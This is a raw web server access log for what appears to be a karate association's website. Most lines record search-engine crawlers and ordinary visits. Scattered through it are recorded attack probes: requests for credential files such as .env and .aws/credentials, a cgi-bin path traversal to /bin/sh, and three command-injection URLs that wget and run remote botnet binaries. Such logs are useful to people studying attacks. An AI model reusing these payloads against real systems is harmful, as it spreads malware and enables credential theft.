::ffff:3.120.228.165 - - [01/Aug/2022:02:07:45 +0000] "GET /.msmtprc HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:45 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:45 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:45 +0000] "GET /frontend_dev.php/$ HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:45 +0000] "GET /config.js HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:45 +0000] "GET /config/config.js HTTP/1.1" 404 155 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:46 +0000] "GET /js/config.js HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:46 +0000] "GET /js/envConfig.js HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:46 +0000] "GET /env.config.js HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:46 +0000] "GET /env.js HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:46 +0000] "GET /app/config.yml HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:46 +0000] "GET /app/config/parameters.yml HTTP/1.1" 404 164 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:46 +0000] "GET /config/secrets.yml HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:47 +0000] "GET /secrets.yml HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:3.120.228.165 - - [01/Aug/2022:02:07:47 +0000] "GET /database.yml HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
::ffff:185.7.214.104 - - [01/Aug/2022:02:18:40 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:192.241.206.112 - - [01/Aug/2022:02:33:40 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:207.46.13.46 - - [01/Aug/2022:02:39:19 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:135.125.246.110 - - [01/Aug/2022:02:41:22 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [01/Aug/2022:02:41:22 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:207.46.13.182 - - [01/Aug/2022:02:44:11 +0000] "GET /signup HTTP/1.1" 404 145 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:51.222.253.5 - - [01/Aug/2022:02:44:44 +0000] "GET /photo/index.php HTTP/1.1" 404 154 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:114.119.147.2 - - [01/Aug/2022:02:52:53 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:114.119.151.185 - - [01/Aug/2022:02:54:39 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:185.254.196.115 - - [01/Aug/2022:03:00:44 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [01/Aug/2022:03:00:45 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.75.221 - - [01/Aug/2022:03:03:37 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.221 - - [01/Aug/2022:03:03:37 +0000] "GET /dojoprocedures.html HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:192.241.213.67 - - [01/Aug/2022:03:04:21 +0000] "GET /ReportServer HTTP/1.1" 404 151 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:185.7.214.104 - - [01/Aug/2022:03:21:45 +0000] "GET /console/ HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:40.77.167.41 - - [01/Aug/2022:03:22:56 +0000] "GET /images/butterfields.jpg HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:40.77.167.98 - - [01/Aug/2022:03:34:23 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.117 - - [01/Aug/2022:03:34:27 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.7.214.104 - - [01/Aug/2022:03:55:05 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:66.249.75.219 - - [01/Aug/2022:03:57:29 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.221 - - [01/Aug/2022:03:57:52 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.221 - - [01/Aug/2022:03:57:52 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.217 - - [01/Aug/2022:03:59:30 +0000] "GET /books.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:135.125.246.110 - - [01/Aug/2022:04:07:07 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [01/Aug/2022:04:07:07 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.128.172 - - [01/Aug/2022:04:08:07 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
- - - [01/Aug/2022:04:08:49 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+networkmapping.xyz/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:78.129.165.8 - - [01/Aug/2022:04:12:25 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; aiHitBot/2.9; +https://www.aihitdata.com/about)"
::ffff:78.129.165.8 - - [01/Aug/2022:04:12:27 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; aiHitBot/2.9; +https://www.aihitdata.com/about)"
::ffff:78.129.165.8 - - [01/Aug/2022:04:12:31 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; aiHitBot/2.9; +https://www.aihitdata.com/about)"
::ffff:78.129.165.8 - - [01/Aug/2022:04:12:35 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; aiHitBot/2.9; +https://www.aihitdata.com/about)"
::ffff:78.129.165.8 - - [01/Aug/2022:04:12:37 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (compatible; aiHitBot/2.9; +https://www.aihitdata.com/about)"
::ffff:78.129.165.8 - - [01/Aug/2022:04:12:39 +0000] "GET /schools HTTP/1.1" 200 96626 "-" "Mozilla/5.0 (compatible; aiHitBot/2.9; +https://www.aihitdata.com/about)"
::ffff:78.129.165.8 - - [01/Aug/2022:04:12:46 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; aiHitBot/2.9; +https://www.aihitdata.com/about)"
::ffff:78.129.165.8 - - [01/Aug/2022:04:12:48 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; aiHitBot/2.9; +https://www.aihitdata.com/about)"
::ffff:185.254.196.115 - - [01/Aug/2022:04:32:41 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [01/Aug/2022:04:32:42 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:163.123.143.71 - - [01/Aug/2022:04:34:11 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:45.148.10.81 - - [01/Aug/2022:04:34:57 +0000] "GET http://example.com/ HTTP/1.1" 200 58071 "-" "Go-http-client/1.1"
::ffff:185.7.214.104 - - [01/Aug/2022:04:59:43 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:51.222.253.2 - - [01/Aug/2022:05:09:38 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.10 - - [01/Aug/2022:05:09:39 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:207.46.13.182 - - [01/Aug/2022:05:12:05 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.196.220.70 - - [01/Aug/2022:05:14:48 +0000] "GET / HTTP/1.1" 200 58071 "-" "Linux Gnu (cow)"
::ffff:207.46.13.42 - - [01/Aug/2022:05:23:32 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.117 - - [01/Aug/2022:05:31:58 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:49.12.131.247 - - [01/Aug/2022:05:32:37 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [01/Aug/2022:05:32:40 +0000] "GET /sitemap HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [01/Aug/2022:05:32:43 +0000] "GET /sitemap.txt HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:135.125.246.110 - - [01/Aug/2022:05:33:23 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [01/Aug/2022:05:33:24 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.213.27.143 - - [01/Aug/2022:06:05:02 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:185.254.196.115 - - [01/Aug/2022:06:06:31 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [01/Aug/2022:06:06:31 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:162.142.125.213 - - [01/Aug/2022:06:17:22 +0000] "GET / HTTP/1.1" 200 58071 "-" "-"
::ffff:162.142.125.213 - - [01/Aug/2022:06:17:22 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:162.142.125.213 - - [01/Aug/2022:06:17:22 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:123.110.7.54 - - [01/Aug/2022:06:17:28 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://138.197.9.111/bins/aqua.mpsl;sh+/tmp/aqua.mpsl HTTP/1.1" - - "-" "Hello, world"
::ffff:185.7.214.104 - - [01/Aug/2022:06:20:17 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:207.46.13.42 - - [01/Aug/2022:06:22:08 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:37.114.201.208 - - [01/Aug/2022:06:29:42 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:207.46.13.46 - - [01/Aug/2022:06:31:02 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.7.214.104 - - [01/Aug/2022:06:36:40 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 404 174 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:66.249.72.227 - - [01/Aug/2022:06:38:14 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.72.231 - - [01/Aug/2022:06:38:14 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:135.125.246.189 - - [01/Aug/2022:07:16:38 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [01/Aug/2022:07:16:39 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.7.214.104 - - [01/Aug/2022:07:29:39 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:221.1.227.119 - - [01/Aug/2022:07:30:36 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://221.1.227.119:49039/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:185.254.196.115 - - [01/Aug/2022:07:32:12 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [01/Aug/2022:07:32:12 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:207.46.13.117 - - [01/Aug/2022:07:32:30 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.54 - - [01/Aug/2022:07:43:56 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.33 - - [01/Aug/2022:07:44:08 +0000] "GET /images/acohen.jpg HTTP/1.1" 404 156 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.191.171.25 - - [01/Aug/2022:07:54:12 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.5 - - [01/Aug/2022:07:54:12 +0000] "GET /index2020.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:192.241.215.252 - - [01/Aug/2022:07:54:49 +0000] "GET /manager/html HTTP/1.1" 404 151 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:8.219.1.49 - - [01/Aug/2022:08:11:40 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:8.219.1.49 - - [01/Aug/2022:08:11:40 +0000] "GET /phpinfo.php HTTP/1.1" 404 150 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:8.219.1.49 - - [01/Aug/2022:08:11:41 +0000] "GET /phpinfo HTTP/1.1" 404 146 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:8.219.1.49 - - [01/Aug/2022:08:11:41 +0000] "GET /aws.yml HTTP/1.1" 404 146 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:8.219.1.49 - - [01/Aug/2022:08:11:42 +0000] "GET /.env.bak HTTP/1.1" 404 147 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:8.219.1.49 - - [01/Aug/2022:08:11:43 +0000] "GET /info.php HTTP/1.1" 404 147 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:8.219.1.49 - - [01/Aug/2022:08:11:43 +0000] "GET /.aws/credentials HTTP/1.1" 404 155 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:8.219.1.49 - - [01/Aug/2022:08:11:44 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:8.219.1.49 - - [01/Aug/2022:08:11:45 +0000] "GET /config/aws.yml HTTP/1.1" 404 153 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:8.219.1.49 - - [01/Aug/2022:08:11:46 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:8.219.1.49 - - [01/Aug/2022:08:11:47 +0000] "GET /config.js HTTP/1.1" 404 148 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:157.90.209.76 - - [01/Aug/2022:08:22:59 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:157.90.209.76 - - [01/Aug/2022:08:22:59 +0000] "GET /sitemap HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:157.90.209.76 - - [01/Aug/2022:08:23:02 +0000] "GET /sitemap.txt HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:85.208.22.181 - - [01/Aug/2022:08:23:14 +0000] "GET / HTTP/1.1" 200 58071 "-" "CATExplorador/1.0beta (sistemes at domini dot cat; https://domini.cat/catexplorador/)"
::ffff:51.222.253.7 - - [01/Aug/2022:08:31:40 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.1 - - [01/Aug/2022:08:31:42 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:173.252.79.9 - - [01/Aug/2022:08:45:31 +0000] "HEAD / HTTP/1.1" 200 58071 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:135.125.246.189 - - [01/Aug/2022:09:01:19 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [01/Aug/2022:09:01:19 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [01/Aug/2022:09:03:22 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [01/Aug/2022:09:03:24 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:198.235.24.128 - - [01/Aug/2022:09:24:48 +0000] "GET / HTTP/1.1" 200 58071 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:73.170.237.58 - - [01/Aug/2022:09:49:59 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:73.170.237.58 - - [01/Aug/2022:09:49:59 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://www.wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:73.170.237.58 - - [01/Aug/2022:09:50:00 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://www.wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:73.170.237.58 - - [01/Aug/2022:09:50:00 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://www.wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
